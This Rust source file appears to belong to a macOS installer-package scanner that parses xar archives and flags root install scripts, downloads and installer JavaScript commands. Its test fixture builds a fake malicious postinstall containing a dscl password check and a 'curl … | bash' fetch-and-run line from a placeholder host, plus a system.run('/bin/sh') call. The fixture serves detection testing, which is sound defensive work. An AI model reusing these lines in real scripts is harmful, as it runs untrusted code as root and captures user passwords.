//! macOS installer packages (`.pkg`): a xar archive whose `Scripts` entries are gzipped cpio
//! archives that Installer runs as root. Only the header, the table of contents and the script
//! entries are read; the payload is seeked past, never unpacked.

use std::io::{Read, Seek, SeekFrom};

use bee_evidence::{Evidence, Severity};
use flate2::read::{GzDecoder, ZlibDecoder};

use crate::formats::{Magic, magic_of};
use crate::text::{Context, scan_text};

const TOC_MAX: u64 = 16 * 1024 * 1024;
const ENTRY_MAX: u64 = 32 * 1024 * 1024;
const CPIO_ENTRIES_MAX: usize = 10_000;

pub struct PkgScan {
    pub evidence: Vec<Evidence>,
    pub unchecked: Vec<String>,
}

struct Entry {
    name: String,
    offset: u64,
    length: u64,
    size: u64,
    encoding: String,
}

fn be_u16(b: &[u8]) -> u16 {
    u16::from_be_bytes([b[0], b[1]])
}

fn be_u64(b: &[u8]) -> u64 {
    u64::from_be_bytes(b[..8].try_into().unwrap())
}

fn read_limited(r: impl Read, limit: u64) -> Result<Vec<u8>, String> {
    let mut out = Vec::new();
    r.take(limit + 1)
        .read_to_end(&mut out)
        .map_err(|_| "a damaged entry".to_string())?;
    if out.len() as u64 > limit {
        return Err("an entry larger than bee-eater will read".into());
    }
    Ok(out)
}

/// Exactly `n` bytes from the archive; the bytes after them belong to the next entry.
fn read_exact_n(r: &mut impl Read, n: u64) -> Result<Vec<u8>, String> {
    let mut out = vec![0u8; usize::try_from(n).map_err(|_| "an impossible size")?];
    r.read_exact(&mut out)
        .map_err(|_| "the archive is cut short".to_string())?;
    Ok(out)
}

pub fn is_xar(head: &[u8]) -> bool {
    head.starts_with(b"xar!")
}

pub fn scan_pkg<R: Read + Seek>(r: &mut R, path: &str) -> Result<PkgScan, String> {
    let mut header = [0u8; 28];
    r.read_exact(&mut header)
        .map_err(|_| "too short to be a package")?;
    if !is_xar(&header) {
        return Err("not a xar archive".into());
    }
    let header_size = u64::from(be_u16(&header[4..]));
    let toc_compressed = be_u64(&header[8..]);
    let toc_size = be_u64(&header[16..]);
    if toc_compressed > TOC_MAX || toc_size > TOC_MAX {
        return Err("a table of contents larger than bee-eater will read".into());
    }
    r.seek(SeekFrom::Start(header_size))
        .map_err(|e| e.to_string())?;
    let compressed = read_exact_n(r, toc_compressed)?;
    let toc = read_limited(ZlibDecoder::new(&compressed[..]), toc_size)?;
    let toc = String::from_utf8(toc).map_err(|_| "a table of contents that is not text")?;
    let doc =
        roxmltree::Document::parse(&toc).map_err(|_| "a table of contents that is not XML")?;
    let heap = header_size + toc_compressed;

    let mut entries = Vec::new();
    for file in doc
        .root_element()
        .children()
        .filter(|n| n.has_tag_name("toc"))
        .flat_map(|t| t.children())
    {
        collect(file, "", &mut entries);
    }
    let signed = doc
        .descendants()
        .any(|n| n.has_tag_name("signature") || n.has_tag_name("x-signature"));

    let mut out = PkgScan {
        evidence: Vec::new(),
        unchecked: Vec::new(),
    };
    out.evidence.push(
        Evidence::new(
            "installer-package",
            Severity::Info,
            if signed {
                "A macOS installer package. It carries a signature, which bee-eater did not verify."
            } else {
                "A macOS installer package with no signature, so nothing vouches for who made it."
            },
        )
        .at(path, None),
    );

    let mut payloads = 0usize;
    for e in &entries {
        let leaf = e.name.rsplit('/').next().unwrap_or(&e.name);
        match leaf {
            "Payload" => payloads += 1,
            "Scripts" => {
                let bytes = match read_entry(r, heap, e) {
                    Ok(b) => b,
                    Err(why) => {
                        out.unchecked.push(format!(
                            "{}: {why}, so its install scripts were not read.",
                            e.name
                        ));
                        continue;
                    }
                };
                scripts(&bytes, &format!("{path}!/{}", e.name), &mut out);
            }
            "Distribution" if !e.name.contains('/') => {
                if let Ok(bytes) = read_entry(r, heap, e)
                    && let Ok(text) = std::str::from_utf8(&bytes)
                {
                    distribution(text, &format!("{path}!/Distribution"), &mut out);
                }
            }
            _ => {}
        }
    }
    if payloads > 0 {
        out.evidence.push(
            Evidence::new(
                "unread-payload",
                Severity::Opaque,
                "The files it installs (its payload) were not looked inside, and that is usually where the program itself is.",
            )
            .at(path, None),
        );
    }
    Ok(out)
}

fn collect(node: roxmltree::Node, prefix: &str, out: &mut Vec<Entry>) {
    if !node.has_tag_name("file") {
        return;
    }
    let child_text = |n: roxmltree::Node, tag: &str| {
        n.children()
            .find(|c| c.has_tag_name(tag))
            .and_then(|c| c.text())
            .map(str::trim)
            .map(str::to_string)
    };
    let Some(name) = child_text(node, "name") else {
        return;
    };
    let full = if prefix.is_empty() {
        name
    } else {
        format!("{prefix}/{name}")
    };
    if let Some(data) = node.children().find(|c| c.has_tag_name("data")) {
        let num = |tag| child_text(data, tag).and_then(|t| t.parse::<u64>().ok());
        let encoding = data
            .children()
            .find(|c| c.has_tag_name("encoding"))
            .and_then(|c| c.attribute("style"))
            .unwrap_or("application/octet-stream")
            .to_string();
        if let (Some(offset), Some(length)) = (num("offset"), num("length")) {
            out.push(Entry {
                name: full.clone(),
                offset,
                length,
                size: num("size").unwrap_or(length),
                encoding,
            });
        }
    }
    for child in node.children() {
        collect(child, &full, out);
    }
}

fn read_entry<R: Read + Seek>(r: &mut R, heap: u64, e: &Entry) -> Result<Vec<u8>, String> {
    if e.length > ENTRY_MAX || e.size > ENTRY_MAX {
        return Err("it is larger than bee-eater will read".into());
    }
    r.seek(SeekFrom::Start(heap + e.offset))
        .map_err(|e| e.to_string())?;
    let raw = read_exact_n(r, e.length)?;
    match e.encoding.as_str() {
        "application/octet-stream" => Ok(raw),
        // xar calls it gzip; the bytes are a zlib stream.
        "application/x-gzip" => read_limited(ZlibDecoder::new(&raw[..]), ENTRY_MAX),
        other => Err(format!(
            "it is compressed as {other}, which bee-eater cannot open yet"
        )),
    }
}

fn scripts(bytes: &[u8], label: &str, out: &mut PkgScan) {
    let cpio = if bytes.starts_with(&[0x1f, 0x8b]) {
        match read_limited(GzDecoder::new(bytes), ENTRY_MAX) {
            Ok(b) => b,
            Err(why) => {
                out.unchecked.push(format!("{label}: {why}."));
                return;
            }
        }
    } else {
        bytes.to_vec()
    };
    let files = match cpio_files(&cpio) {
        Ok(f) => f,
        Err(why) => {
            out.unchecked.push(format!(
                "{label}: {why}, so its install scripts were not read."
            ));
            return;
        }
    };
    for (name, data) in files {
        let at = format!("{label}/{name}");
        let leaf = name.rsplit('/').next().unwrap_or(&name);
        if matches!(
            leaf,
            "preinstall" | "postinstall" | "preflight" | "postflight"
        ) {
            out.evidence.push(
                Evidence::new(
                    "runs-on-install",
                    Severity::Info,
                    format!("Installer runs \"{leaf}\" as root when you click Install."),
                )
                .at(&at, None),
            );
        }
        if let Magic::Compiled(what) = magic_of(&data) {
            out.evidence.push(
                Evidence::new(
                    "compiled-program",
                    Severity::Opaque,
                    format!("An install-time {what}, run as root, which bee-eater cannot look inside yet."),
                )
                .at(&at, None),
            );
            continue;
        }
        if let Ok(text) = std::str::from_utf8(&data) {
            out.evidence
                .extend(scan_text(text, Context::AutoRun, &at, Some(0)));
            if let Some((line, tool, excerpt)) = crate::text::fetch_tool(text) {
                out.evidence.push(
                    Evidence::new(
                        "downloads-more",
                        Severity::Opaque,
                        format!("This install script can download more (it uses {tool}), and whatever it downloads was not fetched or read."),
                    )
                    .at(&at, Some(line))
                    .excerpt(excerpt),
                );
            }
        }
    }
}

fn distribution(text: &str, label: &str, out: &mut PkgScan) {
    if let Some((n, line)) = text
        .lines()
        .enumerate()
        .find(|(_, l)| l.contains("system.run"))
    {
        out.evidence.push(
            Evidence::new(
                "installer-javascript-run",
                Severity::Warning,
                "The installer's own script runs a command on your Mac while it decides how to install.",
            )
            .at(label, Some(n + 1))
            .excerpt(line),
        );
    }
    out.evidence
        .extend(scan_text(text, Context::AutoRun, label, Some(0)));
}

fn octal(b: &[u8]) -> Option<u64> {
    u64::from_str_radix(std::str::from_utf8(b).ok()?, 8).ok()
}

fn hex(b: &[u8]) -> Option<u64> {
    u64::from_str_radix(std::str::from_utf8(b).ok()?, 16).ok()
}

/// Regular files from an odc (`070707`) or newc (`070701`) cpio archive. Links and devices are
/// skipped; nothing is written anywhere.
pub(crate) fn cpio_files(b: &[u8]) -> Result<Vec<(String, Vec<u8>)>, String> {
    let bad = || "a damaged cpio archive".to_string();
    let mut files = Vec::new();
    let mut pos = 0usize;
    loop {
        if files.len() > CPIO_ENTRIES_MAX {
            return Err("more script files than bee-eater will read".into());
        }
        let head = b.get(pos..pos + 6).ok_or_else(bad)?;
        let (mode, namesize, filesize, header_len, align) = match head {
            b"070707" => {
                let h = b.get(pos..pos + 76).ok_or_else(bad)?;
                (
                    octal(&h[18..24]).ok_or_else(bad)?,
                    octal(&h[59..65]).ok_or_else(bad)? as usize,
                    octal(&h[65..76]).ok_or_else(bad)? as usize,
                    76,
                    1,
                )
            }
            b"070701" | b"070702" => {
                let h = b.get(pos..pos + 110).ok_or_else(bad)?;
                (
                    hex(&h[14..22]).ok_or_else(bad)?,
                    hex(&h[94..102]).ok_or_else(bad)? as usize,
                    hex(&h[54..62]).ok_or_else(bad)? as usize,
                    110,
                    4,
                )
            }
            _ => return Err(bad()),
        };
        let name_start = pos + header_len;
        let name = b.get(name_start..name_start + namesize).ok_or_else(bad)?;
        let name = String::from_utf8_lossy(name.strip_suffix(&[0]).unwrap_or(name)).into_owned();
        let data_start = (name_start + namesize).next_multiple_of(align);
        if name == "TRAILER!!!" {
            break;
        }
        let data = b.get(data_start..data_start + filesize).ok_or_else(bad)?;
        if mode & 0o170000 == 0o100000 {
            files.push((name.trim_start_matches("./").to_string(), data.to_vec()));
        }
        pos = (data_start + filesize).next_multiple_of(align);
    }
    Ok(files)
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::io::{Cursor, Write};

    pub fn odc(files: &[(&str, u32, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut entry = |name: &str, mode: u32, data: &[u8]| {
            let n = name.len() + 1;
            write!(
                out,
                "070707{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:06o}{:011o}{:06o}{:011o}{}\0",
                0,
                1,
                mode,
                0,
                0,
                1,
                0,
                0,
                n,
                data.len(),
                name
            )
            .unwrap();
            out.extend_from_slice(data);
        };
        for (name, mode, data) in files {
            entry(name, *mode, data);
        }
        entry("TRAILER!!!", 0, b"");
        out
    }

    /// A minimal xar with entries stored either raw or zlib-compressed.
    pub fn xar(entries: &[(&str, &[u8], bool)]) -> Vec<u8> {
        let mut heap = Vec::new();
        let mut files = String::new();
        for (i, (name, data, zlib)) in entries.iter().enumerate() {
            let stored = if *zlib {
                let mut z =
                    flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::fast());
                z.write_all(data).unwrap();
                z.finish().unwrap()
            } else {
                data.to_vec()
            };
            let style = if *zlib {
                "application/x-gzip"
            } else {
                "application/octet-stream"
            };
            files.push_str(&format!(
                "<file id=\"{}\"><name>{name}</name><type>file</type><data><offset>{}</offset><length>{}</length><size>{}</size><encoding style=\"{style}\"/></data></file>",
                i + 1,
                heap.len(),
                stored.len(),
                data.len()
            ));
            heap.extend_from_slice(&stored);
        }
        let toc = format!("<?xml version=\"1.0\"?><xar><toc>{files}</toc></xar>");
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::fast());
        z.write_all(toc.as_bytes()).unwrap();
        let ztoc = z.finish().unwrap();
        let mut out = Vec::new();
        out.extend_from_slice(b"xar!");
        out.extend_from_slice(&28u16.to_be_bytes());
        out.extend_from_slice(&1u16.to_be_bytes());
        out.extend_from_slice(&(ztoc.len() as u64).to_be_bytes());
        out.extend_from_slice(&(toc.len() as u64).to_be_bytes());
        out.extend_from_slice(&0u32.to_be_bytes());
        out.extend_from_slice(&ztoc);
        out.extend_from_slice(&heap);
        out
    }

    fn gzip(b: &[u8]) -> Vec<u8> {
        let mut g = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        g.write_all(b).unwrap();
        g.finish().unwrap()
    }

    #[test]
    fn cpio_odc_and_links() {
        let a = odc(&[
            ("./postinstall", 0o100755, b"#!/bin/sh\necho hi\n"),
            ("./link", 0o120777, b"/etc/passwd"),
        ]);
        let files = cpio_files(&a).unwrap();
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].0, "postinstall");
        assert!(cpio_files(&a[..40]).is_err());
    }

    #[test]
    fn a_fake_installer_with_a_root_postinstall_stealer() {
        let scripts = gzip(&odc(&[(
            "./postinstall",
            0o100755,
            b"#!/bin/bash\ndscl . -authonly \"$USER\" \"$pw\"\ncurl -fsSL https://x.invalid/p | bash\n",
        )]));
        let pkg = xar(&[
            ("Distribution", b"<installer-gui-script><script>system.run('/bin/sh')</script></installer-gui-script>", true),
            ("app.pkg/Scripts", &scripts, false),
            ("app.pkg/Payload", b"\x1f\x8b not read", false),
        ]);
        let mut r = Cursor::new(pkg);
        let scan = scan_pkg(&mut r, "Setup.pkg").unwrap();
        let rules: Vec<_> = scan.evidence.iter().map(|e| (e.rule, e.severity)).collect();
        assert!(
            rules.contains(&("password-check", Severity::Danger)),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("download-and-run", Severity::Danger)),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("runs-on-install", Severity::Info)),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("installer-javascript-run", Severity::Warning)),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("unread-payload", Severity::Opaque)),
            "{rules:?}"
        );
        let at = scan
            .evidence
            .iter()
            .find(|e| e.rule == "password-check")
            .unwrap();
        assert_eq!(
            at.location.as_ref().unwrap().path,
            "Setup.pkg!/app.pkg/Scripts/postinstall"
        );
        assert!(scan.evidence[0].summary.contains("no signature"));
    }

    #[test]
    fn hostile_sizes_are_refused() {
        let mut pkg = xar(&[("Scripts", b"x", false)]);
        pkg[8..16].copy_from_slice(&u64::MAX.to_be_bytes());
        assert!(scan_pkg(&mut Cursor::new(pkg), "x.pkg").is_err());
    }
}
